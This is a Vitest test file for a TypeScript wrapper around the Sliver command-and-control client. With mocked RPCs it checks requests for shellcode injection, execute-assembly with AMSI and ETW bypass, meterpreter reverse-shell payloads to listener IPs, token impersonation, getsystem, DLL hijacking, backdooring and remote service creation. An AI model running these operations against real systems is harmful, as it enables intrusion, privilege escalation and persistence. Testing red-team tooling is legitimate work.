// @vitest-environment node

import { clientpb, SliverClient, type SliverClientConfig } from "sliver-script";
import { describe, expect, it, vi } from "vitest";

const sessionRequest60 = {
  Async: false,
  Timeout: "59999999999",
  BeaconID: "",
  SessionID: "session-42",
};

const beaconRequest60 = {
  Async: true,
  Timeout: "59999999999",
  BeaconID: "beacon-42",
  SessionID: "",
};

describe("closed Sliver M4 wrapper surface", () => {
  it("constructs canonical execute variants and background-child requests", async () => {
    const execute = vi.fn(async () => ({}));
    const executeWindows = vi.fn(async () => ({}));
    const executeChildren = vi.fn(async () => ({ Children: [] }));
    const client = clientWithRpc({ control: { execute, executeWindows, executeChildren } });

    await client.executeSession("session-42", {
      path: "/usr/bin/env",
      args: ["printf", "ok"],
      stdoutPath: "/tmp/stdout",
      stderrPath: "/tmp/stderr",
      envInheritance: true,
      env: { MODE: "review" },
    });
    await client.executeBeacon("beacon-42", {
      path: "C:\\Windows\\System32\\whoami.exe",
      args: ["/all"],
      output: true,
      background: true,
      useToken: true,
      hideWindow: true,
      parentPid: 31337,
    });
    await client.executeChildrenSession("session-42");
    await client.executeChildrenBeacon("beacon-42");

    expect(execute).toHaveBeenCalledWith(
      {
        Path: "/usr/bin/env",
        Args: ["printf", "ok"],
        Output: true,
        Stdout: "/tmp/stdout",
        Stderr: "/tmp/stderr",
        EnvInheritance: true,
        Env: { MODE: "review" },
        Background: false,
        PPid: 0,
        Request: sessionRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(executeWindows).toHaveBeenCalledWith(
      {
        Path: "C:\\Windows\\System32\\whoami.exe",
        Args: ["/all"],
        Output: false,
        Stdout: "",
        Stderr: "",
        UseToken: true,
        HideWindow: true,
        Background: true,
        PPid: 31337,
        Request: beaconRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(executeChildren).toHaveBeenNthCalledWith(
      1,
      { Request: sessionRequest60 },
      { signal: expect.any(AbortSignal) },
    );
    expect(executeChildren).toHaveBeenNthCalledWith(
      2,
      { Request: beaconRequest60 },
      { signal: expect.any(AbortSignal) },
    );
  });

  it("routes binary execution primitives through the artifact client and clears owned copies", async () => {
    const owned: Buffer[] = [];
    const wire: Record<string, Record<string, unknown>> = {};
    const capture = (name: string, field: string) => vi.fn(async (request: Record<string, unknown>) => {
      const bytes = request[field] as Buffer;
      owned.push(bytes);
      wire[name] = { ...request, [field]: Buffer.from(bytes) };
      return {};
    });
    const artifact = {
      executeAssembly: capture("assembly", "Assembly"),
      task: capture("shellcode", "Data"),
      sideload: capture("sideload", "Data"),
      spawnDll: capture("spawnDll", "Data"),
    };
    const legacy = {
      executeAssembly: vi.fn(), task: vi.fn(), sideload: vi.fn(), spawnDll: vi.fn(),
    };
    const client = clientWithRpc({ artifact, control: legacy });
    const assembly = Buffer.from("assembly-bytes");
    const shellcode = Buffer.from("shellcode-bytes");
    const library = Buffer.from("library-bytes");
    const dll = Buffer.from("dll-bytes");

    await client.executeAssemblySession("session-42", assembly, {
      arguments: ["arg one"],
      process: "host.exe",
      isDll: true,
      arch: "x64",
      className: "Example.Program",
      method: "Main",
      appDomain: "Review",
      parentPid: 44,
      processArgs: ["--host"],
      inProcess: true,
      runtime: "v4.0.30319",
      amsiBypass: true,
      etwBypass: true,
    });
    await client.executeShellcodeBeacon("beacon-42", shellcode, { pid: 99, rwxPages: true });
    await client.sideloadSession("session-42", library, {
      processName: "/usr/bin/host",
      args: ["one"],
      entryPoint: "entry",
      keepAlive: true,
      isDll: false,
      isUnicode: true,
      parentPid: 45,
      processArgs: ["--host"],
    });
    await client.spawnDllBeacon("beacon-42", dll, {
      processName: "host.exe",
      args: ["two"],
      entryPoint: "ReflectiveLoader",
      keepAlive: false,
    });

    expect(wire["assembly"]).toEqual({
      Assembly: assembly,
      Arguments: ["arg one"],
      Process: "host.exe",
      IsDLL: true,
      Arch: "x64",
      ClassName: "Example.Program",
      Method: "Main",
      AppDomain: "Review",
      PPid: 44,
      ProcessArgs: ["--host"],
      InProcess: true,
      Runtime: "v4.0.30319",
      AmsiBypass: true,
      EtwBypass: true,
      Request: sessionRequest60,
    });
    expect(wire["shellcode"]).toEqual({
      Encoder: "",
      RWXPages: true,
      Pid: 99,
      Data: shellcode,
      Request: beaconRequest60,
    });
    expect(wire["sideload"]).toEqual({
      Data: library,
      ProcessName: "/usr/bin/host",
      Args: ["one"],
      EntryPoint: "entry",
      Kill: false,
      isDLL: false,
      isUnicode: true,
      PPid: 45,
      ProcessArgs: ["--host"],
      Request: sessionRequest60,
    });
    expect(wire["spawnDll"]).toEqual({
      Data: dll,
      ProcessName: "host.exe",
      Args: ["two"],
      EntryPoint: "ReflectiveLoader",
      Kill: true,
      PPid: 0,
      ProcessArgs: [],
      Request: beaconRequest60,
    });
    expect(owned).toHaveLength(4);
    for (const bytes of owned) expect(bytes.every((value) => value === 0)).toBe(true);
    expect(assembly.toString()).toBe("assembly-bytes");
    expect(shellcode.toString()).toBe("shellcode-bytes");
    expect(library.toString()).toBe("library-bytes");
    expect(dll.toString()).toBe("dll-bytes");
    for (const rpc of Object.values(legacy)) expect(rpc).not.toHaveBeenCalled();
  });

  it("matches migrate and Metasploit request fields without mutating caller config", async () => {
    const migrate = vi.fn(async () => ({ Success: true, Pid: 7 }));
    const msf = vi.fn(async () => ({}));
    const msfRemote = vi.fn(async () => ({}));
    const shellcodeEncoderMap = vi.fn(async () => ({ Encoders: {} }));
    const client = clientWithRpc({ control: { migrate, msf, msfRemote, shellcodeEncoderMap } });
    const config = clientpb.ImplantConfig.create({
      ID: "implant-id",
      GOOS: "windows",
      GOARCH: "amd64",
      HTTPC2ConfigName: "",
      C2: [{ ID: "", Priority: 0, URL: "mtls://example", Options: "" }],
    });

    await client.getShellcodeEncoderMap();
    await client.migrateSession("session-42", {
      pid: 777,
      config,
      encoder: clientpb.ShellcodeEncoder.XOR_DYNAMIC,
      name: "DARK_FINISH",
    });
    await client.migrateBeacon("beacon-42", {
      processName: "explorer.exe",
      config,
      name: "SILENT_WAVE",
    });
    await client.msfSession("session-42", { lhost: "10.0.0.1" });
    await client.msfRemoteBeacon("beacon-42", {
      pid: 888,
      payload: "meterpreter_reverse_tcp",
      lhost: "10.0.0.2",
      lport: 5555,
      encoder: "x64/xor",
      iterations: 3,
    });

    expect(shellcodeEncoderMap).toHaveBeenCalledWith({}, { signal: expect.any(AbortSignal) });
    expect(migrate).toHaveBeenNthCalledWith(
      1,
      expect.objectContaining({
        Pid: 777,
        Encoder: clientpb.ShellcodeEncoder.XOR_DYNAMIC,
        Name: "DARK_FINISH",
        ProcName: "",
        Config: expect.objectContaining({ HTTPC2ConfigName: "default" }),
        Request: sessionRequest60,
      }),
      { signal: expect.any(AbortSignal) },
    );
    expect(migrate).toHaveBeenNthCalledWith(
      2,
      expect.objectContaining({
        Pid: 0,
        Encoder: clientpb.ShellcodeEncoder.NONE,
        Name: "SILENT_WAVE",
        ProcName: "explorer.exe",
        Request: beaconRequest60,
      }),
      { signal: expect.any(AbortSignal) },
    );
    expect(msf).toHaveBeenCalledWith(
      {
        Payload: "meterpreter_reverse_https",
        LHost: "10.0.0.1",
        LPort: 4444,
        Encoder: "",
        Iterations: 1,
        Request: sessionRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(msfRemote).toHaveBeenCalledWith(
      {
        Payload: "meterpreter_reverse_tcp",
        LHost: "10.0.0.2",
        LPort: 5555,
        Encoder: "x64/xor",
        Iterations: 3,
        PID: 888,
        Request: beaconRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(config.HTTPC2ConfigName).toBe("");
  });

  it("constructs identity and privilege requests with canonical deadlines", async () => {
    const rpc = {
      currentTokenOwner: vi.fn(async () => ({ Output: "DOMAIN\\operator" })),
      getPrivs: vi.fn(async () => ({ PrivInfo: [] })),
      impersonate: vi.fn(async () => ({})),
      revToSelf: vi.fn(async () => ({})),
      runAs: vi.fn(async () => ({})),
      makeToken: vi.fn(async () => ({})),
      getSystem: vi.fn(async () => ({})),
    };
    const client = clientWithRpc({ control: rpc });
    const config = clientpb.ImplantConfig.create({ GOOS: "windows", GOARCH: "amd64" });

    await client.currentTokenOwnerSession("session-42");
    await client.currentTokenOwnerBeacon("beacon-42");
    await client.getPrivsSession("session-42");
    await client.getPrivsBeacon("beacon-42");
    await client.impersonateSession("session-42", "DOMAIN\\operator");
    await client.revToSelfBeacon("beacon-42");
    await client.runAsSession("session-42", {
      username: "operator",
      processName: "cmd.exe",
      args: "/c whoami",
      domain: "DOMAIN",
      password: "one-use-password",
      showWindow: true,
      netOnly: true,
    });
    await client.makeTokenBeacon("beacon-42", {
      username: "operator",
      password: "one-use-password",
      domain: "DOMAIN",
      logonType: 8,
    });
    await client.getSystemSession("session-42", { config });

    expect(rpc.currentTokenOwner).toHaveBeenNthCalledWith(1, { Request: sessionRequest60 }, { signal: expect.any(AbortSignal) });
    expect(rpc.currentTokenOwner).toHaveBeenNthCalledWith(2, { Request: beaconRequest60 }, { signal: expect.any(AbortSignal) });
    expect(rpc.getPrivs).toHaveBeenNthCalledWith(1, { Request: sessionRequest60 }, { signal: expect.any(AbortSignal) });
    expect(rpc.getPrivs).toHaveBeenNthCalledWith(2, { Request: beaconRequest60 }, { signal: expect.any(AbortSignal) });
    const request30Session = { ...sessionRequest60, Timeout: "29999999999" };
    const request30Beacon = { ...beaconRequest60, Timeout: "29999999999" };
    expect(rpc.impersonate).toHaveBeenCalledWith(
      { Username: "DOMAIN\\operator", Request: request30Session },
      { signal: expect.any(AbortSignal) },
    );
    expect(rpc.revToSelf).toHaveBeenCalledWith(
      { Request: request30Beacon },
      { signal: expect.any(AbortSignal) },
    );
    expect(rpc.runAs).toHaveBeenCalledWith(
      {
        Username: "operator",
        ProcessName: "cmd.exe",
        Args: "/c whoami",
        Domain: "DOMAIN",
        Password: "one-use-password",
        HideWindow: false,
        NetOnly: true,
        Request: request30Session,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(rpc.makeToken).toHaveBeenCalledWith(
      {
        Username: "operator",
        Password: "one-use-password",
        Domain: "DOMAIN",
        LogonType: 8,
        Request: beaconRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(rpc.getSystem).toHaveBeenCalledWith(
      {
        HostingProcess: "spoolsv.exe",
        Config: expect.objectContaining({ HTTPC2ConfigName: "default" }),
        Name: "",
        Request: sessionRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
  });

  it("keeps SSH and DLL-hijack binary secrets operation-local while backdoor stays unary", async () => {
    let ownedPrivateKey: Buffer | undefined;
    let ownedKeytab: Buffer | undefined;
    let ownedReferenceDll: Buffer | undefined;
    let ownedTargetDll: Buffer | undefined;
    let sshWire: Record<string, unknown> | undefined;
    let hijackWire: Record<string, unknown> | undefined;
    const runSSHCommand = vi.fn(async (request: Record<string, unknown>) => {
      ownedPrivateKey = request["PrivKey"] as Buffer;
      ownedKeytab = request["Keytab"] as Buffer;
      sshWire = {
        ...request,
        PrivKey: Buffer.from(ownedPrivateKey),
        Keytab: Buffer.from(ownedKeytab),
      };
      return {};
    });
    const backdoor = vi.fn(async () => ({}));
    const hijackDLL = vi.fn(async (request: Record<string, unknown>) => {
      ownedReferenceDll = request["ReferenceDLL"] as Buffer;
      ownedTargetDll = request["TargetDLL"] as Buffer;
      hijackWire = {
        ...request,
        ReferenceDLL: Buffer.from(ownedReferenceDll),
        TargetDLL: Buffer.from(ownedTargetDll),
      };
      return {};
    });
    const client = clientWithRpc({ control: { runSSHCommand, backdoor }, artifact: { hijackDLL } });
    const privateKey = Buffer.from("private-key");
    const keytab = Buffer.from("keytab");
    const referenceDll = Buffer.from("reference-dll");
    const targetDll = Buffer.from("target-dll");

    await client.runSshSession("session-42", {
      username: "operator",
      hostname: "server.example",
      port: 2222,
      command: ["uname", "-a"],
      password: "one-use-password",
      privateKey,
      kerberosConfigPath: "/etc/krb5.conf",
      kerberosKeytab: keytab,
      kerberosRealm: "EXAMPLE.COM",
    });
    await client.backdoorSession("session-42", {
      filePath: "C:\\Temp\\program.exe",
      profileName: "windows-service",
      name: "review-build",
    });
    await client.hijackDllSession("session-42", {
      referenceDllPath: "C:\\Windows\\System32\\version.dll",
      targetLocation: "C:\\Temp\\version.dll",
      referenceDll,
      targetDll,
      name: "hijack-review",
    });

    expect(sshWire).toEqual({
      Username: "operator",
      Hostname: "server.example",
      Port: 2222,
      Command: "uname -a",
      Password: "one-use-password",
      PrivKey: privateKey,
      Krb5Conf: "/etc/krb5.conf",
      Keytab: keytab,
      Realm: "EXAMPLE.COM",
      Request: sessionRequest60,
    });
    expect(backdoor).toHaveBeenCalledWith(
      {
        FilePath: "C:\\Temp\\program.exe",
        ProfileName: "windows-service",
        Name: "review-build",
        Request: sessionRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(hijackWire).toEqual({
      ReferenceDLLPath: "C:\\Windows\\System32\\version.dll",
      TargetLocation: "C:\\Temp\\version.dll",
      ReferenceDLL: referenceDll,
      TargetDLL: targetDll,
      ProfileName: "",
      Name: "hijack-review",
      Request: sessionRequest60,
    });
    expect(ownedPrivateKey?.every((value) => value === 0)).toBe(true);
    expect(ownedKeytab?.every((value) => value === 0)).toBe(true);
    expect(ownedReferenceDll?.every((value) => value === 0)).toBe(true);
    expect(ownedTargetDll?.every((value) => value === 0)).toBe(true);
    expect(privateKey.toString()).toBe("private-key");
    expect(keytab.toString()).toBe("keytab");
    expect(referenceDll.toString()).toBe("reference-dll");
    expect(targetDll.toString()).toBe("target-dll");
  });

  it("constructs session-only remote service requests and returns successful results", async () => {
    const started = { Response: { Err: "" } };
    const removed = { Response: { Err: "" } };
    const startService = vi.fn(async () => started);
    const removeService = vi.fn(async () => removed);
    const client = clientWithRpc({ control: { startService, removeService } });

    const startResult = await client.startRemoteServiceSession("session-42", {
      hostname: "workstation.example",
      serviceName: "TelemetryReview",
      serviceDescription: "Telemetry review service",
      binaryPath: "C:\\Windows\\Temp\\review.exe",
      args: "--service --quiet",
    });
    const removeResult = await client.removeRemoteServiceSession("session-42", {
      hostname: "workstation.example",
      serviceName: "TelemetryReview",
    });

    expect(startService).toHaveBeenCalledWith(
      {
        ServiceName: "TelemetryReview",
        ServiceDescription: "Telemetry review service",
        BinPath: "C:\\Windows\\Temp\\review.exe",
        Hostname: "workstation.example",
        Arguments: "--service --quiet",
        Request: sessionRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(removeService).toHaveBeenCalledWith(
      {
        ServiceInfo: {
          Hostname: "workstation.example",
          ServiceName: "TelemetryReview",
        },
        Request: sessionRequest60,
      },
      { signal: expect.any(AbortSignal) },
    );
    expect(startResult).toBe(started);
    expect(removeResult).toBe(removed);
  });

  it("bounds remote service inputs and preserves target responses for main-owned classification", async () => {
    const startService = vi.fn(async () => ({ Response: { Err: "secret remote SCM detail" } }));
    const removeService = vi.fn(async () => ({ Response: { Err: "secret remote deletion detail" } }));
    const client = clientWithRpc({ control: { startService, removeService } });
    const startOptions = {
      hostname: "workstation.example",
      serviceName: "TelemetryReview",
      serviceDescription: "Telemetry review service",
      binaryPath: "C:\\Windows\\Temp\\review.exe",
    };

    await expect(client.startRemoteServiceSession("session-42", startOptions)).resolves.toEqual({
      Response: { Err: "secret remote SCM detail" },
    });
    await expect(client.removeRemoteServiceSession("session-42", {
      hostname: "workstation.example",
      serviceName: "TelemetryReview",
    })).resolves.toEqual({ Response: { Err: "secret remote deletion detail" } });

    expect(() => client.startRemoteServiceSession("session-42", {
      ...startOptions,
      hostname: " ",
    })).toThrow(/hostname must not be empty/u);
    expect(() => client.startRemoteServiceSession("session-42", {
      ...startOptions,
      serviceName: "s".repeat(257),
    })).toThrow(/service name must not exceed 256 characters/u);
    expect(() => client.startRemoteServiceSession("session-42", {
      ...startOptions,
      args: "a".repeat(32_768),
    })).toThrow(/arguments must not exceed 32767 characters/u);
    expect(() => client.removeRemoteServiceSession("session-42", {
      hostname: "h".repeat(256),
      serviceName: "TelemetryReview",
    })).toThrow(/hostname must not exceed 255 characters/u);
    expect(startService).toHaveBeenCalledTimes(1);
    expect(removeService).toHaveBeenCalledTimes(1);
  });

  it("rejects ambiguous or incomplete M4 requests before dispatch", async () => {
    const rpc = {
      executeWindows: vi.fn(),
      executeAssembly: vi.fn(),
      migrate: vi.fn(),
      makeToken: vi.fn(),
      runSSHCommand: vi.fn(),
      hijackDLL: vi.fn(),
    };
    const client = clientWithRpc({ control: rpc, artifact: rpc });
    const config = clientpb.ImplantConfig.create();

    expect(() => client.executeSession("session-42", {
      path: "cmd.exe", useToken: true, env: { MODE: "invalid" },
    })).toThrow(/Environment options/u);
    expect(() => client.executeAssemblySession("session-42", Buffer.from("dll"), {
      isDll: true,
    })).toThrow(/class name and method/u);
    expect(() => client.migrateSession("session-42", { config, name: "target" })).toThrow(/process id or process name/u);
    expect(() => client.makeTokenSession("session-42", {
      username: "operator", password: "password", logonType: 6 as never,
    })).toThrow(/logon type/u);
    expect(() => client.runSshSession("session-42", {
      username: "operator", hostname: "server", kerberosRealm: "EXAMPLE.COM",
    })).toThrow(/requires a keytab/u);
    expect(() => client.hijackDllSession("session-42", {
      referenceDllPath: "reference.dll",
      targetLocation: "target.dll",
      targetDll: Buffer.from("dll"),
      profileName: "profile",
    })).toThrow(/either target DLL bytes or a profile/u);
    await expect(client.executeChildrenSession(" ")).rejects.toThrow(/Session id/u);
    for (const method of Object.values(rpc)) expect(method).not.toHaveBeenCalled();
  });
});

function clientWithRpc(rpc: Record<string, Record<string, unknown>>): SliverClient {
  const config: SliverClientConfig = {
    operator: "m4-wrapper-test",
    lhost: "127.0.0.1",
    lport: 31_337,
    ca_certificate: "fixture-ca",
    certificate: "fixture-cert",
    private_key: "fixture-key",
    token: "fixture-token",
  };
  const client = new SliverClient(config);
  const internals = client as unknown as { rpcClients: Record<string, unknown> };
  Object.assign(internals.rpcClients, rpc);
  return client;
}
